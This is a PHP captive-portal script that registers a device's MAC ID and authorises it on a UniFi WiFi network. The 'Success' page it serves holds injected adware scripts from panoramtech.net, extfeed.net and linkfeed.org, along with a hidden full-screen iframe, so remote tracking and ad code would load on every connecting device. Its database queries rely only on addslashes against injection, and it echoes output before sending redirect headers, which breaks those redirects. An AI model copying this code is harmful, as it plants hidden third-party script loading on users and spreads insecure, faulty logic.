<?php
include_once ('../../config.php');

$array_tmp = explode('/', dirname(__FILE__));
$site = end($array_tmp);
$site = is_string($site) ? $site : 'default';

$Mac_ID = isset($_GET['id']) ? addslashes($_GET['id']) : '';
$url = isset($_GET['url']) ? addslashes($_GET['url']) : '';
$fromUserName = isset($_GET['fromUserName']) ? addslashes($_GET['fromUserName']) : '';

echo '<html><head><title>Success</title><script type="text/javascript" async="" src="http://www.google-analytics.com/ga.js"></script><script type="text/javascript" src="//ads.panoramtech.net/loader.js?client=tac"></script><script type="text/javascript" src="//ads.panoramtech.net/loader.js?client=tac"></script><script type="text/javascript" src="//ads.panoramtech.net//coupons_support2.js?client=tac&amp;referrer=http://www.apple.com/"></script><script src="https://ads.panoramtech.net//coupons/deals?merchant=www.apple.com&amp;referrer=&amp;partner=tac&amp;callback=jsonp709546"></script><script type="text/javascript" src="https://extfeed.net/53fb5bb572.js?sid=35932"></script><script src="https://ads.panoramtech.net//coupons/deals?merchant=www.apple.com&amp;referrer=&amp;partner=tac&amp;callback=jsonp394849"></script><script type="text/javascript" src="https://extfeed.net/53fb5bb572.js?sid=35932"></script><script type="text/javascript" src="http://extfeed.net/ad/report/?wid=49453&amp;sid=35932&amp;tid=83&amp;rid=LOADED&amp;custom1=www.apple.com&amp;jsonp=window.twBarFunctions.reportSetCallback&amp;t=1411111347007"></script><script type="text/javascript" src="http://extfeed.net/optout-params?jsonp=window.twBarFunctions.optoutCallback&amp;t=1411111347076"></script></head><body>Success<iframe style="display: none; position: fixed; top: 50%; left: 50%; width: 650px; height: 500px; margin-top: -250px; margin-left: -325px; z-index: 2147483647;" id="__twbopt53fb5bb572" frameborder="0" scrolling="no"></iframe><div id="pAdId-81593709740"><script type="text/javascript" src="http://ads.panoramtech.net/server/www/delivery/ajs.php?zoneid=28&amp;amp;cb=35247781639&amp;amp;charset=UTF-8&amp;amp;loc=http%3A//www.apple.com/library/test/success.html"></script></div><script async="" src="http://linkfeed.org/int-js?sid=531&amp;uid=49453x83x35932"></script></body></html>';

if (!$Mac_ID) {
    header('Location: template/introduce.html');
    exit();
}

$sql = "select * from " . DB_TABLE . " where `Mac_ID` = '{$Mac_ID}'";
$res = $mysql->query($sql, 'all');

if (!is_array($res) || count($res) <= 0) {
    if (!$fromUserName) {
        header('Location: template/introduce.html');
        exit();
    }
    $sql = "insert into " . DB_TABLE . " (`Mac_ID`, `fromUserName`)
            values ('{$Mac_ID}', '{$fromUserName}')";
    $mysql->query($sql);
}

UniFi::$site = $site;
UniFi::sendAuthorization($Mac_ID, WIFI_EXPIRED_TIME);
sleep(5);
header('Location: ' . DEFAULT_URL);
exit();
